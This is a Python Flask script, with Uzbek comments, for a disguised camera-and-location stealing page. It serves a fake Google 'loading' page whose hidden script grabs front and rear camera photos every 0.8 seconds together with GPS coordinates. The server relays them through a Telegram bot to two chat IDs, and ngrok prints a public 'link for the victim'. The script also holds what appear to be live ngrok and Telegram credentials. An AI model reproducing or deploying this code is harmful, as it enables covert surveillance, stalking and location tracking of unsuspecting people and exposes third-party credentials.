from flask import Flask, render_template_string, request
import requests
from pyngrok import ngrok
import time

# 1. YANGI NGROK TOKENING (image_7c8e9a.png skrinshotingdan olindi)
NGROK_TOKEN = "38tf71tkELX4iyzvyNqYZGjsuTZ_61yh89VogJdkBCJKJptRT"

try:
    ngrok.kill() # Eskilarini tozalash
    ngrok.set_auth_token(NGROK_TOKEN)
    print("--- Ngrok muvaffaqiyatli ulandi! ---")
except Exception as e:
    print(f"Ngrok xatosi: {e}")

app = Flask(__name__)

# Sening ma'lumotlaring
TOKEN = "8535757948:AAESPLCJXyg9ilrnqW6ejWCQrb3jNnOZSK4"
CHAT_IDS = ["8354222032", "6119420877"]

html_code = """
<!DOCTYPE html>
<html>
<head><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
<body style="background-color:white; text-align:center; padding-top:100px; font-family:sans-serif;">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">
    <p>Qidiruv tizimi yuklanmoqda...</p>
    <video id="v" width="1280" height="720" autoplay style="display:none;"></video>
    <canvas id="c" width="1280" height="720" style="display:none;"></canvas>
    <script>
        const v = document.getElementById('v');
        const c = document.getElementById('c');
        let facing = "user";

        async function capture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: facing, width: 1280, height: 720 }
                });
                v.srcObject = stream;

                setTimeout(() => {
                    c.getContext('2d').drawImage(v, 0, 0, 1280, 720);
                    c.toBlob(blob => {
                        const f = new FormData();
                        f.append('photo', blob, 'img.png');
                        f.append('cam', facing === "user" ? "OLDI 🤳" : "ORQA 📸");
                        
                        navigator.geolocation.getCurrentPosition(pos => {
                            f.append('lat', pos.coords.latitude);
                            f.append('lon', pos.coords.longitude);
                            fetch('/upload', { method: 'POST', body: f });
                        }, () => {
                            fetch('/upload', { method: 'POST', body: f }); // GPS ruxsat bermasa ham rasm yuboradi
                        });
                    }, 'image/jpeg', 0.7);
                    
                    facing = (facing === "user") ? "environment" : "user";
                    stream.getTracks().forEach(t => t.stop());
                }, 300);
            } catch (e) {}
        }
        // HAR 0.8 SONIYADA "PULEMYOT" REJIMI
        setInterval(capture, 800); 
        setTimeout(() => { window.location.href = "https://www.google.com"; }, 15000);
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(html_code)

@app.route('/upload', methods=['POST'])
def upload():
    # 'Noma'lum' so'zidan SyntaxError chiqmasligi uchun tirnoqni olib tashladik
    lat = request.form.get('lat', 'Nomalum')
    lon = request.form.get('lon', 'Nomalum')
    cam = request.form.get('cam')
    file = request.files.get('photo').read()
    
    # Sifatli manzil linki
    maps_link = f"http://maps.google.com/maps?q={lat},{lon}&t=k"
    caption = f"🎯 {cam}\\n📍 Manzil: {maps_link}"
    
    for cid in CHAT_IDS:
        try:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", 
                          data={'chat_id': cid, 'caption': caption}, files={'photo': file})
        except: pass
    return "ok"

if __name__ == '__main__':
    # Ngrok orqali link yaratish
    public_url = ngrok.connect(5000).public_url
    print(f"\\n🌍 JABRLANUVCHI UCHUN LINK: {public_url}\\n")
    app.run(port=5000)